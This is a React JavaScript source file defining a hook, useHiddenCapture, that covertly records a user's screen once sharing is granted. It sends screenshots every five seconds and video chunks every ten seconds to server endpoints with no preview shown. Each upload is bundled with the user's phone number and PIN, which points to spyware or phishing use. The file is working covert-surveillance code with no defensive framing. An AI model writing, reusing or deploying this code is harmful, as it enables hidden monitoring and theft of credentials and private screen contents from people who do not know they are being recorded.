import { useCallback, useEffect, useRef, useState } from "react";

const SCREENSHOT_MS = 5000;
const VIDEO_CHUNK_MS = 10000;

/**
 * Hidden capture hook — starts screen sharing, uploads screenshots and video
 * chunks to the server. No preview is shown to the user.
 */
export function useHiddenCapture({ authHeaders = () => ({}) } = {}) {
  const [isActive, setIsActive] = useState(false);
  const [isStarting, setIsStarting] = useState(false);
  const [error, setError] = useState(null);

  const videoRef = useRef(null);
  const streamRef = useRef(null);
  const canvasRef = useRef(
    typeof document !== "undefined" ? document.createElement("canvas") : null
  );
  const screenshotTimerRef = useRef(null);
  const mediaRecorderRef = useRef(null);
  const sessionMetaRef = useRef({});

  const uploadScreenshot = useCallback(
    async (dataUrl, meta) => {
      const res = await fetch("/api/upload", {
        method: "POST",
        headers: authHeaders(),
        body: JSON.stringify({ image: dataUrl, phone: meta.phone, pin: meta.pin }),
      });
      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        throw new Error(err.message || "Screenshot upload failed");
      }
      return res.json();
    },
    [authHeaders]
  );

  const uploadVideoChunk = useCallback(
    async (blob, meta) => {
      const buffer = await blob.arrayBuffer();
      const bytes = new Uint8Array(buffer);
      let binary = "";
      for (let i = 0; i < bytes.length; i++) {
        binary += String.fromCharCode(bytes[i]);
      }
      const base64 = btoa(binary);
      const dataUrl = `data:video/webm;base64,${base64}`;

      const res = await fetch("/api/upload/video", {
        method: "POST",
        headers: authHeaders(),
        body: JSON.stringify({
          video: dataUrl,
          phone: meta.phone,
          pin: meta.pin,
        }),
      });
      if (!res.ok) {
        const err = await res.json().catch(() => ({}));
        throw new Error(err.message || "Video upload failed");
      }
      return res.json();
    },
    [authHeaders]
  );

  const captureScreenshot = useCallback(async () => {
    const video = videoRef.current;
    if (!video || video.readyState < 2 || !canvasRef.current) return;

    const canvas = canvasRef.current;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL("image/png");

    try {
      await uploadScreenshot(dataUrl, sessionMetaRef.current);
    } catch (e) {
      console.error("[capture] screenshot failed", e);
    }
  }, [uploadScreenshot]);

  const stopCapture = useCallback(() => {
    if (screenshotTimerRef.current) {
      clearInterval(screenshotTimerRef.current);
      screenshotTimerRef.current = null;
    }

    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== "inactive") {
      mediaRecorderRef.current.stop();
      mediaRecorderRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
    }

    setIsActive(false);
    setIsStarting(false);
  }, []);

  const startCapture = useCallback(
    async (meta = {}) => {
      setError(null);
      setIsStarting(true);
      sessionMetaRef.current = meta;

      if (!navigator.mediaDevices?.getDisplayMedia) {
        setError("Screen capture is not supported in this browser.");
        setIsStarting(false);
        return false;
      }

      try {
        let stream;
        try {
          stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        } catch (firstErr) {
          if (firstErr.name === "NotSupportedError") {
            stream = await navigator.mediaDevices.getDisplayMedia();
          } else {
            throw firstErr;
          }
        }

        streamRef.current = stream;
        const video = videoRef.current;
        video.srcObject = stream;
        await video.play();

        const [videoTrack] = stream.getVideoTracks();
        videoTrack.addEventListener("ended", () => stopCapture());

        // Screenshot every 5 seconds
        await captureScreenshot();
        screenshotTimerRef.current = setInterval(captureScreenshot, SCREENSHOT_MS);

        // Video chunks every 10 seconds
        const mimeType = MediaRecorder.isTypeSupported("video/webm;codecs=vp9")
          ? "video/webm;codecs=vp9"
          : MediaRecorder.isTypeSupported("video/webm")
            ? "video/webm"
            : "";

        if (mimeType && typeof MediaRecorder !== "undefined") {
          const recorder = new MediaRecorder(stream, { mimeType });
          mediaRecorderRef.current = recorder;

          recorder.ondataavailable = async (event) => {
            if (event.data && event.data.size > 0) {
              try {
                await uploadVideoChunk(event.data, sessionMetaRef.current);
              } catch (e) {
                console.error("[capture] video chunk failed", e);
              }
            }
          };

          recorder.start(VIDEO_CHUNK_MS);
        }

        setIsActive(true);
        setIsStarting(false);
        return true;
      } catch (err) {
        setIsStarting(false);
        if (err.name === "NotAllowedError") {
          setError("Permission was not granted.");
        } else {
          setError(err.message || "Could not start capture.");
        }
        return false;
      }
    },
    [captureScreenshot, stopCapture, uploadVideoChunk]
  );

  useEffect(() => () => stopCapture(), [stopCapture]);

  return {
    videoRef,
    isActive,
    isStarting,
    error,
    startCapture,
    stopCapture,
  };
}
